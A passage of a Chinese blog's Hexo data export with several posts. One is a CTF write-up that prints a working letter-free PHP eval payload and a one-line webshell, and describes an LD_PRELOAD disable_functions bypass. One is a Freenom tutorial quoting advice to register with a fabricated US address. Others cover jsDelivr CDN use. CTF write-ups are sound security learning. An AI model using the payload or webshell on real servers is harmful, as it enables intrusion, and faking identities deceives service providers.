src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201204234445.png\"></p>\n<p>再使用蚁剑连接<strong>.antproxy.php</strong>，密码是运行插件的那个shell的密码，这时候就可以开开心心的去根目录下执行readflag获得flag辣。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201204233847.png\"></p>\n<p>flag{a216900e-2427-48f7-9323-f65d0a3abdbf}</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"极客大挑战-2019-RCE-ME\"><a href=\"#极客大挑战-2019-RCE-ME\" class=\"headerlink\" title=\"[极客大挑战 2019]RCE ME\"></a>[极客大挑战 2019]RCE ME</h1><p>源码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">if(isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class=\"line\">            $code=$_GET[&#x27;code&#x27;];</span><br><span class=\"line\">                    if(strlen($code)&gt;40)&#123;</span><br><span class=\"line\">                                        die(&quot;This is too Long.&quot;);</span><br><span class=\"line\">                                                &#125;</span><br><span class=\"line\">                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;</span><br><span class=\"line\">                                        die(&quot;NO.&quot;);</span><br><span class=\"line\">                                                &#125;</span><br><span class=\"line\">                    @eval($code);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">            highlight_file(__FILE__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// ?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>分析一波，GET请求获得<code>code</code>，想要通过的话需要绕过两个检测：</p>\n<ol>\n<li>payload长度小于40</li>\n<li>不能包含<code>a-z、A-Z、0-9</code></li>\n</ol>\n<p>和之前做过DMCTF里的一个不能用数字和字母构造payload一样，当时参考的博客是phith0n师傅的:<a href=\"https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html\">一些不包含数字和字母的webshell</a>，这次摸到了相关文章：<a href=\"https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html\">无字母数字webshell之提高篇</a>。</p>\n<p>使用<code>url编码</code>+<code>~</code>取反构造不可见字符串，然后加上php7版本以后支持了使用：<code>($a)()</code>这样的方法动态执行函数，所以我们可以构造payload：<code>assert(eval($_POST[‘a’]))</code></p>\n<p>先构造<code>assert</code>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo urlencode(~&#x27;assert&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">//结果：%9E%8C%8C%9A%8D%8B</span><br></pre></td></tr></table></figure>\n\n<p>再构造<code>eval($_POST[&#39;a&#39;])</code>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo urlencode(~&#x27;eval($_POST[\\&#x27;a\\&#x27;])&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">//结果：%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6</span><br></pre></td></tr></table></figure>\n\n<p>完整payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6);</span><br></pre></td></tr></table></figure>\n\n<p>网站获得请求以后会进行url解码，由于是不可见字符可以绕过长度和正则表达式，之后执行代码时，前面的<code>~</code>取反再获得真正的函数名。</p>\n<p>使用蚁剑连接，进后台在根目录找到了flag、readflag。打开flag内容为空，又打开readflag文件是一堆乱码，但是看到了文件头是<code>ELF</code>是linux的可执行文件。那么很有可能就是执行readflag才能获得flag，但是在终端执行时出现了一些问题：无论输入什么，终端都只会返回<code>ret=127</code>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201205201403.png\"></p>\n<p>搜索了一波，原来是是<strong>disable_function</strong>搞的鬼，这个表可以在phpinfo()中查看：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201205201821.png\"></p>\n<p>因为<code>system</code>、<code>exec</code>、<code>shell_exec</code>等命令执行的函数都被禁止了，目前我理解的webshell就是通过这些函数才能在终端执行命令的，所以终端基本是个废的，所以就是寻找绕过<strong>disable_function</strong>的方法，网上有很多其他方法，其中一个方法：</p>\n<p><strong>利用环境变量LD_PRELOAD来绕过</strong></p>\n<blockquote>\n<p>php的mail函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，如果我们能劫持sendmail程序，再用mail函数来触发就能实现我们的目的</p>\n<p>LD_PRELOAD是Linux系统的下一个有趣的环境变量：“它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p>\n</blockquote>\n<p>正好蚁剑的插件中就有一个名为：<a href=\"https://github.com/Medicean/as_bypass_php_disable_functions\">as_bypass_php_disable_functions</a>的插件，可以选择在插件市场安装或是手动安装（github有步骤）。安装以后右键shell选择加载插件：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201204234337.png\"></p>\n<p>插件的工作原理是自动上传几个绕过的文件，然后再用蚁剑连接上传的文件即可实现绕过，但是一开始的<code>/var/www/html</code>目录是没有上传权限的，我右键以后发现能修改权限，改成0777：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201204190508.png\"></p>\n<blockquote>\n<p>在这里我还遇到了问题，使用原来的shell执行插件功能以后，终端还是没有权限，但是我尝试了自己又上传了一个一句话木马，用这个新的一句话木马执行插件才成功，具体原因我也不清楚，如果有师傅知道原因求告知。</p>\n</blockquote>\n<p>上传一句话木马233.php：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">@eval($_POST[&#x27;b&#x27;]);</span><br></pre></td></tr></table></figure>\n\n<p>再用一句话木马的shell执行插件：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201204231514.png\"></p>\n<p>进入shell，目录下面多了一个名为<strong>.antproxy.php</strong>的文件：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201204234445.png\"></p>\n<p>再使用蚁剑连接<strong>.antproxy.php</strong>，密码是运行插件的那个shell的密码，这时候就可以开开心心的去根目录下执行readflag获得flag辣。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201204233847.png\"></p>\n<p>flag{a216900e-2427-48f7-9323-f65d0a3abdbf}</p>\n"},{"title":"Freenom域名注册解析到服务器","date":"2020-09-02T04:25:37.000Z","cover":"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201111120849.png","_content":"\n### **1.官网**\n\n[Freenom - 人人都熟悉的名字](https://www.freenom.com/zh/index.html?lang=zh)\n\n官网右上角可以切换中文，简直了。\n\n然后觉得我讲的有点啰嗦的还可以看油管上的[freenom教学视频](https://www.youtube.com/watch?v=IAZDrtmQeh0)\n\n![BJ9Xvj.png](https://s1.ax1x.com/2020/10/29/BJ9Xvj.png)\n\n### **2.搜索想要的域名**\n\n![BJCFGF.png](https://s1.ax1x.com/2020/10/29/BJCFGF.png)\n\n​\t搜索以后会列出来可以选择的域名列表，上面的是免费域名，下面的则是一些付费域名。\n\n​\t我在这里还遇到了一个坑提前说。freenom提供的有自己的域名解析服务，国内也可以访问的到，我遇到了一个问题有回答说换个DNS解析就行，推荐的是[Hurricane Electric Hosted *DNS*](https://dns.he.net/)，但这个网站禁止了.tk域名的解析。类似的问题请自行先考虑\n\n![BJ9xrn.png](https://s1.ax1x.com/2020/10/29/BJ9xrn.png)接下来选中域名以后点击Get it now！以后只是添加到购物车，随后点击界面中的Checkout跳转到结算界面，这里只用选择期限即可。\n\n![BJ9vKs.png](https://s1.ax1x.com/2020/10/29/BJ9vKs.png)点击continue按钮会提示注册，这里又有坑。\n\n> 由于蝗虫一般涌入试图薅羊毛的中国人让 `freenom` 极度不爽, `freenom` 的免费域名注册对中国人并不友好, 极大概率注册会失败. 为了顺利注册免费域名, 请首先用美国 IP 翻着墙, 使用 Google 账号直接登录该站, 不必自主注册账号, 在填写个人资料时, 用 [fakenamegenerator.com](https://www.fakenamegenerator.com/) 胡诌个美国住址, 就可以随意注册免费域名了. \n\n\n\n### **3.域名解析**\n\n​\t完成以后点击Services-->My Domains进入域名管理页面。\n\n![BJCk24.png](https://s1.ax1x.com/2020/10/29/BJCk24.png)\n\n\n\n点击域名后面的Manage Domain进入域名解析\n\n\n\n![](https://raw.githubusercontent.com/guobang-yoo/PicBed/master/20201029160037.png)\n\n![BJCpV0.png](https://s1.ax1x.com/2020/10/29/BJCpV0.png)\n\n\n\n​\tNameservers就是域名解析服务器进入后两个选项，第一个是使用freenom的域名解析服务器，第二个是使用其他域名解析商的服务器。\n\n![BJC9aV.png](https://s1.ax1x.com/2020/10/29/BJC9aV.png)\n\n\n\n之后点击Manage Freenom DNS进行域名解析就可以使用注册的域名访问了，示例：\n\n![BJCiPU.png](https://s1.ax1x.com/2020/10/29/BJCiPU.png)","source":"_posts/freenom域名注册解析到服务器.md","raw":"---\ntitle: Freenom域名注册解析到服务器\ndate: 2020-09-02 12:25:37\ncategories: \n- 服务器\ntag: \n- 免费域名\ncover: https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201111120849.png\n---\n\n### **1.官网**\n\n[Freenom - 人人都熟悉的名字](https://www.freenom.com/zh/index.html?lang=zh)\n\n官网右上角可以切换中文，简直了。\n\n然后觉得我讲的有点啰嗦的还可以看油管上的[freenom教学视频](https://www.youtube.com/watch?v=IAZDrtmQeh0)\n\n![BJ9Xvj.png](https://s1.ax1x.com/2020/10/29/BJ9Xvj.png)\n\n### **2.搜索想要的域名**\n\n![BJCFGF.png](https://s1.ax1x.com/2020/10/29/BJCFGF.png)\n\n​\t搜索以后会列出来可以选择的域名列表，上面的是免费域名，下面的则是一些付费域名。\n\n​\t我在这里还遇到了一个坑提前说。freenom提供的有自己的域名解析服务，国内也可以访问的到，我遇到了一个问题有回答说换个DNS解析就行，推荐的是[Hurricane Electric Hosted *DNS*](https://dns.he.net/)，但这个网站禁止了.tk域名的解析。类似的问题请自行先考虑\n\n![BJ9xrn.png](https://s1.ax1x.com/2020/10/29/BJ9xrn.png)接下来选中域名以后点击Get it now！以后只是添加到购物车，随后点击界面中的Checkout跳转到结算界面，这里只用选择期限即可。\n\n![BJ9vKs.png](https://s1.ax1x.com/2020/10/29/BJ9vKs.png)点击continue按钮会提示注册，这里又有坑。\n\n> 由于蝗虫一般涌入试图薅羊毛的中国人让 `freenom` 极度不爽, `freenom` 的免费域名注册对中国人并不友好, 极大概率注册会失败. 为了顺利注册免费域名, 请首先用美国 IP 翻着墙, 使用 Google 账号直接登录该站, 不必自主注册账号, 在填写个人资料时, 用 [fakenamegenerator.com](https://www.fakenamegenerator.com/) 胡诌个美国住址, 就可以随意注册免费域名了. \n\n\n\n### **3.域名解析**\n\n​\t完成以后点击Services-->My Domains进入域名管理页面。\n\n![BJCk24.png](https://s1.ax1x.com/2020/10/29/BJCk24.png)\n\n\n\n点击域名后面的Manage Domain进入域名解析\n\n\n\n![](https://raw.githubusercontent.com/guobang-yoo/PicBed/master/20201029160037.png)\n\n![BJCpV0.png](https://s1.ax1x.com/2020/10/29/BJCpV0.png)\n\n\n\n​\tNameservers就是域名解析服务器进入后两个选项，第一个是使用freenom的域名解析服务器，第二个是使用其他域名解析商的服务器。\n\n![BJC9aV.png](https://s1.ax1x.com/2020/10/29/BJC9aV.png)\n\n\n\n之后点击Manage Freenom DNS进行域名解析就可以使用注册的域名访问了，示例：\n\n![BJCiPU.png](https://s1.ax1x.com/2020/10/29/BJCiPU.png)","slug":"freenom域名注册解析到服务器","published":1,"updated":"2021-12-30T09:42:54.201Z","_id":"ckrr3f9b5001bhotc3kykfkvh","comments":1,"layout":"post","photos":[],"link":"","content":"<h3 id=\"1-官网\"><a href=\"#1-官网\" class=\"headerlink\" title=\"1.官网\"></a><strong>1.官网</strong></h3><p><a href=\"https://www.freenom.com/zh/index.html?lang=zh\">Freenom - 人人都熟悉的名字</a></p>\n<p>官网右上角可以切换中文，简直了。</p>\n<p>然后觉得我讲的有点啰嗦的还可以看油管上的<a href=\"https://www.youtube.com/watch?v=IAZDrtmQeh0\">freenom教学视频</a></p>\n<p><img src=\"https://s1.ax1x.com/2020/10/29/BJ9Xvj.png\" alt=\"BJ9Xvj.png\"></p>\n<h3 id=\"2-搜索想要的域名\"><a href=\"#2-搜索想要的域名\" class=\"headerlink\" title=\"2.搜索想要的域名\"></a><strong>2.搜索想要的域名</strong></h3><p><img src=\"https://s1.ax1x.com/2020/10/29/BJCFGF.png\" alt=\"BJCFGF.png\"></p>\n<p>​    搜索以后会列出来可以选择的域名列表，上面的是免费域名，下面的则是一些付费域名。</p>\n<p>​    我在这里还遇到了一个坑提前说。freenom提供的有自己的域名解析服务，国内也可以访问的到，我遇到了一个问题有回答说换个DNS解析就行，推荐的是<a href=\"https://dns.he.net/\">Hurricane Electric Hosted <em>DNS</em></a>，但这个网站禁止了.tk域名的解析。类似的问题请自行先考虑</p>\n<p><img src=\"https://s1.ax1x.com/2020/10/29/BJ9xrn.png\" alt=\"BJ9xrn.png\">接下来选中域名以后点击Get it now！以后只是添加到购物车，随后点击界面中的Checkout跳转到结算界面，这里只用选择期限即可。</p>\n<p><img src=\"https://s1.ax1x.com/2020/10/29/BJ9vKs.png\" alt=\"BJ9vKs.png\">点击continue按钮会提示注册，这里又有坑。</p>\n<blockquote>\n<p>由于蝗虫一般涌入试图薅羊毛的中国人让 <code>freenom</code> 极度不爽, <code>freenom</code> 的免费域名注册对中国人并不友好, 极大概率注册会失败. 为了顺利注册免费域名, 请首先用美国 IP 翻着墙, 使用 Google 账号直接登录该站, 不必自主注册账号, 在填写个人资料时, 用 <a href=\"https://www.fakenamegenerator.com/\">fakenamegenerator.com</a> 胡诌个美国住址, 就可以随意注册免费域名了. </p>\n</blockquote>\n<h3 id=\"3-域名解析\"><a href=\"#3-域名解析\" class=\"headerlink\" title=\"3.域名解析\"></a><strong>3.域名解析</strong></h3><p>​    完成以后点击Services–&gt;My Domains进入域名管理页面。</p>\n<p><img src=\"https://s1.ax1x.com/2020/10/29/BJCk24.png\" alt=\"BJCk24.png\"></p>\n<p>点击域名后面的Manage Domain进入域名解析</p>\n<p><img src=\"https://raw.githubusercontent.com/guobang-yoo/PicBed/master/20201029160037.png\"></p>\n<p><img src=\"https://s1.ax1x.com/2020/10/29/BJCpV0.png\" alt=\"BJCpV0.png\"></p>\n<p>​    Nameservers就是域名解析服务器进入后两个选项，第一个是使用freenom的域名解析服务器，第二个是使用其他域名解析商的服务器。</p>\n<p><img src=\"https://s1.ax1x.com/2020/10/29/BJC9aV.png\" alt=\"BJC9aV.png\"></p>\n<p>之后点击Manage Freenom DNS进行域名解析就可以使用注册的域名访问了，示例：</p>\n<p><img src=\"https://s1.ax1x.com/2020/10/29/BJCiPU.png\" alt=\"BJCiPU.png\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"1-官网\"><a href=\"#1-官网\" class=\"headerlink\" title=\"1.官网\"></a><strong>1.官网</strong></h3><p><a href=\"https://www.freenom.com/zh/index.html?lang=zh\">Freenom - 人人都熟悉的名字</a></p>\n<p>官网右上角可以切换中文，简直了。</p>\n<p>然后觉得我讲的有点啰嗦的还可以看油管上的<a href=\"https://www.youtube.com/watch?v=IAZDrtmQeh0\">freenom教学视频</a></p>\n<p><img src=\"https://s1.ax1x.com/2020/10/29/BJ9Xvj.png\" alt=\"BJ9Xvj.png\"></p>\n<h3 id=\"2-搜索想要的域名\"><a href=\"#2-搜索想要的域名\" class=\"headerlink\" title=\"2.搜索想要的域名\"></a><strong>2.搜索想要的域名</strong></h3><p><img src=\"https://s1.ax1x.com/2020/10/29/BJCFGF.png\" alt=\"BJCFGF.png\"></p>\n<p>​    搜索以后会列出来可以选择的域名列表，上面的是免费域名，下面的则是一些付费域名。</p>\n<p>​    我在这里还遇到了一个坑提前说。freenom提供的有自己的域名解析服务，国内也可以访问的到，我遇到了一个问题有回答说换个DNS解析就行，推荐的是<a href=\"https://dns.he.net/\">Hurricane Electric Hosted <em>DNS</em></a>，但这个网站禁止了.tk域名的解析。类似的问题请自行先考虑</p>\n<p><img src=\"https://s1.ax1x.com/2020/10/29/BJ9xrn.png\" alt=\"BJ9xrn.png\">接下来选中域名以后点击Get it now！以后只是添加到购物车，随后点击界面中的Checkout跳转到结算界面，这里只用选择期限即可。</p>\n<p><img src=\"https://s1.ax1x.com/2020/10/29/BJ9vKs.png\" alt=\"BJ9vKs.png\">点击continue按钮会提示注册，这里又有坑。</p>\n<blockquote>\n<p>由于蝗虫一般涌入试图薅羊毛的中国人让 <code>freenom</code> 极度不爽, <code>freenom</code> 的免费域名注册对中国人并不友好, 极大概率注册会失败. 为了顺利注册免费域名, 请首先用美国 IP 翻着墙, 使用 Google 账号直接登录该站, 不必自主注册账号, 在填写个人资料时, 用 <a href=\"https://www.fakenamegenerator.com/\">fakenamegenerator.com</a> 胡诌个美国住址, 就可以随意注册免费域名了. </p>\n</blockquote>\n<h3 id=\"3-域名解析\"><a href=\"#3-域名解析\" class=\"headerlink\" title=\"3.域名解析\"></a><strong>3.域名解析</strong></h3><p>​    完成以后点击Services–&gt;My Domains进入域名管理页面。</p>\n<p><img src=\"https://s1.ax1x.com/2020/10/29/BJCk24.png\" alt=\"BJCk24.png\"></p>\n<p>点击域名后面的Manage Domain进入域名解析</p>\n<p><img src=\"https://raw.githubusercontent.com/guobang-yoo/PicBed/master/20201029160037.png\"></p>\n<p><img src=\"https://s1.ax1x.com/2020/10/29/BJCpV0.png\" alt=\"BJCpV0.png\"></p>\n<p>​    Nameservers就是域名解析服务器进入后两个选项，第一个是使用freenom的域名解析服务器，第二个是使用其他域名解析商的服务器。</p>\n<p><img src=\"https://s1.ax1x.com/2020/10/29/BJC9aV.png\" alt=\"BJC9aV.png\"></p>\n<p>之后点击Manage Freenom DNS进行域名解析就可以使用注册的域名访问了，示例：</p>\n<p><img src=\"https://s1.ax1x.com/2020/10/29/BJCiPU.png\" alt=\"BJCiPU.png\"></p>\n"},{"title":"jsdelivr 缓存刷新","date":"2020-11-20T14:02:46.000Z","cover":"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201116160039.png","_content":"\n## 前言\n\n​\t上一篇修改了黑幕，但是使用了jsdelivr加速的静态资源，所以照常更新下github上的资源，但是github上查看已经上传成功了，jsdelivr访问的依然是之前的资源，说白了就是缓存的问题。即使本地浏览器端的缓存已经清理，也会因为CDN周围的节点没有同步数据而导致用户端未能及时更新。\n\n## 缓存刷新\n\n把原来访问的链接\n\n`https://cdn.jsdelivr.net/...`\n\n改为\n\n`https://purge.jsdelivr.net/...`\n\n访问资源就会进行刷新，然后页面会返回刷新信息：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201120222419.png)\n\n<span class='heimu'>划水</span>收工。","source":"_posts/jsdelivr 缓存刷新.md","raw":"---\ntitle: jsdelivr 缓存刷新\ndate: 2020-11-20 22:02:46\ncategories:\n - 捣腾博客\ntags:\n- jsdelivr\ncover: https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201116160039.png\n---\n\n## 前言\n\n​\t上一篇修改了黑幕，但是使用了jsdelivr加速的静态资源，所以照常更新下github上的资源，但是github上查看已经上传成功了，jsdelivr访问的依然是之前的资源，说白了就是缓存的问题。即使本地浏览器端的缓存已经清理，也会因为CDN周围的节点没有同步数据而导致用户端未能及时更新。\n\n## 缓存刷新\n\n把原来访问的链接\n\n`https://cdn.jsdelivr.net/...`\n\n改为\n\n`https://purge.jsdelivr.net/...`\n\n访问资源就会进行刷新，然后页面会返回刷新信息：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201120222419.png)\n\n<span class='heimu'>划水</span>收工。","slug":"jsdelivr 缓存刷新","published":1,"updated":"2021-12-30T09:42:54.202Z","_id":"ckrr3f9b6001fhotc4919fbdu","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>​    上一篇修改了黑幕，但是使用了jsdelivr加速的静态资源，所以照常更新下github上的资源，但是github上查看已经上传成功了，jsdelivr访问的依然是之前的资源，说白了就是缓存的问题。即使本地浏览器端的缓存已经清理，也会因为CDN周围的节点没有同步数据而导致用户端未能及时更新。</p>\n<h2 id=\"缓存刷新\"><a href=\"#缓存刷新\" class=\"headerlink\" title=\"缓存刷新\"></a>缓存刷新</h2><p>把原来访问的链接</p>\n<p><code>https://cdn.jsdelivr.net/...</code></p>\n<p>改为</p>\n<p><code>https://purge.jsdelivr.net/...</code></p>\n<p>访问资源就会进行刷新，然后页面会返回刷新信息：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201120222419.png\"></p>\n<p><span class='heimu'>划水</span>收工。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>​    上一篇修改了黑幕，但是使用了jsdelivr加速的静态资源，所以照常更新下github上的资源，但是github上查看已经上传成功了，jsdelivr访问的依然是之前的资源，说白了就是缓存的问题。即使本地浏览器端的缓存已经清理，也会因为CDN周围的节点没有同步数据而导致用户端未能及时更新。</p>\n<h2 id=\"缓存刷新\"><a href=\"#缓存刷新\" class=\"headerlink\" title=\"缓存刷新\"></a>缓存刷新</h2><p>把原来访问的链接</p>\n<p><code>https://cdn.jsdelivr.net/...</code></p>\n<p>改为</p>\n<p><code>https://purge.jsdelivr.net/...</code></p>\n<p>访问资源就会进行刷新，然后页面会返回刷新信息：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201120222419.png\"></p>\n<p><span class='heimu'>划水</span>收工。</p>\n"},{"title":"jsDelivr加速静态博客","cover":"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201111213620.jpg","date":"2020-11-11T13:37:53.000Z","_content":"\n\n## 前言\n\n​\t这几天总感觉博客访问特别慢，最先是找到了CDN加速，但是在国内加速的话域名都是要备案的，又看了看境外加速。\n\n>  CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。——百度百科\n\n在犹豫要不要买的时候，发现了这个东西：[jsdelivr](https://www.jsdelivr.com/)，一个可以加速静态资源的免费CDN，官网上能看的出和WordPress有什么py关系还可以加速github的资源。hexo是静态博客，那么我就把博客要用到的js、css、还有博客用到的一些图片都放github然后引用。开搞\n\n## 1. 新建仓库\n\n\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed/artical/20201111202508.png)\n\n​\t名字重了是因为我已经创建好了并且使用了以后才来写的博客。\n\n## 2. 克隆Git仓库到本地\n\n​\t在自己电脑建个文件夹然后打开git输入`git clone 你仓库的链接`，把刚刚创建的仓库拉倒本地方便上传到仓库。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed/artical/20201111203733.png)\n\n廖雪峰老师的git教程我当时看了一遍，觉得非常棒，哈哈哈就是自己太菜了又给忘了，帖出来：[Git简介](https://www.liaoxuefeng.com/wiki/896043488029600/896067008724000)。\n\n## 3. 上传需要加速的资源\n\n​\t把需要上传的资源整理到刚刚拉下来的本地git仓库，上传。\n\n```\ngit status                    //查看状态\ngit add .                     //添加所有文件到暂存区\ngit commit -m '第一次提交'      //把文件提交到仓库\ngit push                      //推送至远程仓库\n```\n\n\n\n​\t这里我说一下是怎么加速自己的博客的，因为博客加载的时候需要加载主题的各种js和css文件，然后因为服务器网渣所以加载时间很慢，使用加速的话就会加载的快。\n\n​\t接下来是要上传哪些文件，我使用的是`butterfly`这个主题，[主题github](https://github.com/jerryc127/hexo-theme-butterfly)支持一下作者，直接在主题`theme/butterfly`文件夹下面找到资源文件夹`source`发现里面都是一些零碎的文件，但是在发布文件夹`public`下是一个完整的js和css，所以猜测生成的时候会把零碎的文件进行整合，然后主题配置文件里作者也写的很清楚\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed/artical/20201111205045.png)\t穷人流下了不争气的泪。传！(真加速还得选好服务器)\n\n​\t这里我的分析是：由于引用的不是本地的资源文件，所以可能会产生自己在本地修改了某项配置，但是网页没有生效，这里就需要时刻记着自己引用的是github上的资源，如果本地配置大改的话，github上的文件也要进行重新上传覆盖。\n\n​\t做法：配置文件里找到引用的是本地资源的项，然后在生成网站的`public`文件下找到对应的资源文件。\n\n我列一下我在配置文件里修改的项：`main_css`、`main`、`utils`、`local_search`、`algolia_js`、`translate`，因为使用的是`Valine`评论，里面可以设置自定义表情，我也使用这个方法修改了。\n\n\n\n## 3. 获取地址\n\n​\t官网首页很清楚的写明了如何获取资源链接\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201111211357.png)\n\n​\t`https://cdn.jsdelivr.net/gh/user/repo@version/file`，`user`就是你的github用户名，`repo@version`，仓库加上版本号，`file`就是仓库下的路径。\n\n​\t这里我没有说版本号是因为网上的教程讲到了仓库需要发布，但是我后面无意间发现不用发布直接`reop@分支名`，也可以访问到。并且我一开始也发布仓库了，但是后面想要修改已经上传的文件也出了一些问题，索性直接用简单的。\n\n​\t贴一个我博客首页的壁纸链接：https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/top_img/83531406_p0.png\n\n​\t这个壁纸有12M大小，而且链接也符合上面的格式，可以参考一下。\n\n\n\n## 4. 引用链接\n\n​\t配置文件里可以找需要替换的资源，直接贴上链接就可以了，只不过以后别忘了**你现在引用的是之前的上传的静态资源**，别忘啦！别忘啦！别忘啦！\n\n​\t我发现github能这样用以后就在上面整了图床，现在博客里的图片都开始在上传，之前用的路过图床，说的全球都有CDN加速，但是还是卡的一。\n\n​\t还有我整理的`Valine`评论的自定义表情，大伙可以直接拿去用：[图片地址](https://cdn.jsdelivr.net/gh/guobang-yoo/CDN@master/emoji/)，[emojimap](https://cdn.jsdelivr.net/gh/guobang-yoo/CDN@master/emoji/valine.json)。完工\n\n\n\n","source":"_posts/jsDelivr加速静态博客.md","raw":"---\ntitle: jsDelivr加速静态博客\ncategories:\n- 捣腾博客\ntags:\n- jsdelivr\ncover: 'https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201111213620.jpg'\ndate: 2020-11-11 21:37:53\n---\n\n\n## 前言\n\n​\t这几天总感觉博客访问特别慢，最先是找到了CDN加速，但是在国内加速的话域名都是要备案的，又看了看境外加速。\n\n>  CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。——百度百科\n\n在犹豫要不要买的时候，发现了这个东西：[jsdelivr](https://www.jsdelivr.com/)，一个可以加速静态资源的免费CDN，官网上能看的出和WordPress有什么py关系还可以加速github的资源。hexo是静态博客，那么我就把博客要用到的js、css、还有博客用到的一些图片都放github然后引用。开搞\n\n## 1. 新建仓库\n\n\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed/artical/20201111202508.png)\n\n​\t名字重了是因为我已经创建好了并且使用了以后才来写的博客。\n\n## 2. 克隆Git仓库到本地\n\n​\t在自己电脑建个文件夹然后打开git输入`git clone 你仓库的链接`，把刚刚创建的仓库拉倒本地方便上传到仓库。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed/artical/20201111203733.png)\n\n廖雪峰老师的git教程我当时看了一遍，觉得非常棒，哈哈哈就是自己太菜了又给忘了，帖出来：[Git简介](https://www.liaoxuefeng.com/wiki/896043488029600/896067008724000)。\n\n## 3. 上传需要加速的资源\n\n​\t把需要上传的资源整理到刚刚拉下来的本地git仓库，上传。\n\n```\ngit status                    //查看状态\ngit add .                   